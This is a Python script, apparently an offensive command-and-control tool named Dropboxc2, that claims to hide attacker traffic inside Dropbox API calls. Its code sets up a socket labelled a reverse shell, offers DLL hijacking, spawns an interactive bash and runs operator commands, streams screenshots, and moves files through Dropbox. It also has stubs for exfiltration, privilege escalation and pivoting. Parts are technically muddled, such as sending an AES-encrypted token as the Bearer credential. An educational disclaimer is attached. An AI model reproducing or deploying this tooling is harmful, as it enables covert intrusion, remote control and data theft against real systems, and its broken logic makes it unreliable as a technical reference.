# This script integrates Dropbox API functionality to facilitate communication between the compromised system and the attacker-controlled server, thereby potentially hiding the traffic within legitimate Dropbox communication.

# This C2 is for simulation only and is still under development
# pip install -r requirements.txt
# python3 Dropboxc2.py
# Author: S3N4T0R
# Date: 2024-3-15

# Disclaimer: it's essential to note that this script is for educational purposes only, and any unauthorized use of it could lead to legal consequences.

import subprocess
import sys
import time
import threading
import socket
import base64
import os
import pyautogui
from pyvirtualdisplay import Display
import random
import shutil
import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

BLUE = '\033[94m'
RESET = '\033[0m'


print(BLUE + """
██████╗ ██████╗  ██████╗ ██████╗ ██████╗  ██████╗ ██╗  ██╗  ██████╗ ██████╗ 
██╔══██╗██╔══██╗██╔═══██╗██╔══██╗██╔══██╗██╔═══██╗╚██╗██╔╝ ██╔════╝ ╚════██╗
██║  ██║██████╔╝██║   ██║██████╔╝██████╔╝██║   ██║ ╚███╔╝  ██║       █████╔╝
██║  ██║██╔══██╗██║   ██║██╔═══╝ ██╔══██╗██║   ██║ ██╔██╗  ██║      ██╔═══╝ 
██████╔╝██║  ██║╚██████╔╝██║     ██████╔╝╚██████╔╝██╔╝ ██╗ ╚██████╗ ███████╗
╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═════╝  ╚═════╝ ╚═╝  ╚═╝  ╚═════╝ ╚══════╝
""" + RESET)


access_token = input("Enter your Dropbox access token: ")
ip = input("Enter the IP address for the reverse shell: ")
port = int(input("Enter the port number for the reverse shell: "))

# Encrypt the access token using AES encryption in ECB mode
def encrypt_access_token(token):
    # Prompt the user to enter the AES key
    key = input("Enter your AES key (must be 16, 24, or 32 bytes long): ").encode()
    if len(key) not in [16, 24, 32]:
        print("Invalid key length. AES key must be 16, 24, or 32 bytes long.")
        sys.exit(1)
    cipher = AES.new(key, AES.MODE_ECB)
    token_padded = pad(token.encode(), AES.block_size)
    return base64.b64encode(cipher.encrypt(token_padded)).decode()

# Encrypt the access token
access_token_encrypted = encrypt_access_token(access_token)

# Create the headers for the Dropbox API requests
headers = {
    "Authorization": f"Bearer {access_token_encrypted}",
    "Content-Type": "application/json",
    "User-Agent": "Dropbox-API-Client/2.0",
    "Connection": "keep-alive",  # Maintain persistent connection
    "Accept-Encoding": "gzip, deflate, br",  # Accept compressed responses
    "Accept-Language": "en-US,en;q=0.9",  # Specify language preference
}

# Set up the reverse shell connection
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((ip, port))
s.listen(1)
print("Waiting for incoming connection...")
client_socket, addr = s.accept()

# Function to perform DLL Hijacking
def hijack_dll():
    # Prompt the user for the path of the DLL to hijack
    dll_path = input("Enter the path of the DLL to hijack: ")

    # Prompt the user for the path of the target executable
    target_exe = input("Enter the path of the target executable: ")
    
    # Copy the specified DLL to the directory of the target executable
    shutil.copy(dll_path, os.path.dirname(target_exe))
    
    # Launch the target executable
    subprocess.run(target_exe, shell=True)

# Prompt the user to choose whether to perform DLL hijacking
perform_hijack = input("Do you want to perform DLL hijacking? (yes/no): ").lower()

# If the user chooses to perform DLL hijacking, call the hijack_dll function
if perform_hijack == "yes":
    hijack_dll()
elif perform_hijack == "no":
    print("DLL hijacking will not be performed.")
else:
    print("Invalid input. DLL hijacking will not be performed.")

# Spawn a shell process
shell = subprocess.Popen(['/bin/bash', '-i'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)

# Create a virtual display on the server
display = Display(visible=0, size=(800, 600))
display.start()

# Initialize session management
sessions = {}
session_counter = 1

# Execute commands entered by the user
while True:
    command = input("Enter a command to execute (or type 'exit' to quit): ")
    if command.lower() == "exit":
        break
    
    # Randomize communication intervals
    time.sleep(random.uniform(1, 5))
    
    # Send the command to the shell process and get the output
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    stdout = result.stdout
    stderr = result.stderr
    
    # Send the command and output back to the client
    client_socket.send(command.encode())
    client_socket.send(stdout.encode())
    client_socket.send(stderr.encode())

    # If the command is 'screen', start capturing the virtual display
    if command.lower() == "screen":
        session_id = str(session_counter)
        session_counter += 1
        sessions[session_id] = {"socket": client_socket, "display": display}
        print(f"Started screen session {session_id}")

        # Capture the virtual display and convert it to base64
        screen = pyautogui.screenshot()
        screen_data = base64.b64encode(screen.tobytes()).decode('utf-8')

        # Send the base64-encoded screen data to the client
        client_socket.send(screen_data.encode())

        # Continuously capture the screen and send updates to the client
        while True:
            try:
                # Capture the virtual display
                screen = pyautogui.screenshot()
                screen_data = base64.b64encode(screen.tobytes()).decode('utf-8')

                # Send the base64-encoded screen data to the client
                client_socket.send(screen_data.encode())

                # Sleep for a short interval to control the screen update rate
                time.sleep(0.1)
            except KeyboardInterrupt:
                # If the user interrupts the screen capture, stop the loop
                print("\nScreen session ended.")
                break
    elif command.lower() == "exfiltrate":
        # Example: Exfiltrate sensitive data
        # Replace this with your own exfiltration method
        client_socket.send("Exfiltrating sensitive data...".encode())
        # Add your exfiltration code here

    elif command.lower() == "escalate":
        # Example: Escalate privileges
        # Replace this with your own privilege escalation method
        client_socket.send("Escalating privileges...".encode())
        # Add your privilege escalation code here

    elif command.lower() == "pivot":
        # Example: Pivot to other systems in the network
        # Replace this with your own pivoting method
        client_socket.send("Pivoting to other systems...".encode())
        # Add your pivoting code here

    elif command.lower() == "upload":
        # Example: Upload a file to Dropbox
        file_path = input("Enter the path of the file to upload: ")
        file_name = os.path.basename(file_path)
        with open(file_path, "rb") as f:
            file_data = f.read()
        url = "https://content.dropboxapi.com/2/files/upload"
        headers["Dropbox-API-Arg"] = '{"path": "/'+ file_name +'","mode": "add","autorename": true,"mute": false,"strict_conflict": false}'
        response = requests.post(url, headers=headers, data=file_data)
        client_socket.send(response.text.encode())

    elif command.lower() == "download":
        # Example: Download a file from Dropbox
        file_path = input("Enter the path of the file to download: ")
        url = "https://content.dropboxapi.com/2/files/download"
        headers["Dropbox-API-Arg"] = '{"path": "'+ file_path +'"}'
        response = requests.post(url, headers=headers)
        with open(os.path.basename(file_path), "wb") as f:
            f.write(response.content)
        client_socket.send("File downloaded successfully.".encode())

    elif command.lower() == "get":
        # Example: Get file metadata from Dropbox
        file_path = input("Enter the path of the file: ")
        url = "https://api.dropboxapi.com/2/files/get_metadata"
        data = {"path": file_path}
        response = requests.post(url, headers=headers, json=data)
        client_socket.send(response.text.encode())

    elif command.lower() == "remove":
        # Example: Remove a file from Dropbox
        file_path = input("Enter the path of the file to remove: ")
        url = "https://api.dropboxapi.com/2/files/delete_v2"
        data = {"path": file_path}
        response = requests.post(url, headers=headers, json=data)
        client_socket.send(response.text.encode())

    elif command.lower() == "add":
        # Example: Create a folder on Dropbox
        folder_path = input("Enter the path of the folder to create: ")
        url = "https://api.dropboxapi.com/2/files/create_folder_v2"
        data = {"path": folder_path}
        response = requests.post(url, headers=headers, json=data)
        client_socket.send(response.text.encode())

    elif command.lower() == "list_folder":
        # Example: List files and folders in a directory on Dropbox
        folder_path = input("Enter the path of the folder to list: ")
        url = "https://api.dropboxapi.com/2/files/list_folder"
        data = {"path": folder_path}
        response = requests.post(url, headers=headers, json=data)
        client_socket.send(response.text.encode())

    else:
        # If the command is not 'screen', send the output back to the client
        client_socket.send(stdout.encode())
        client_socket.send(stderr.encode())

# Close the connection
client_socket.close()
s.close()
display.stop()
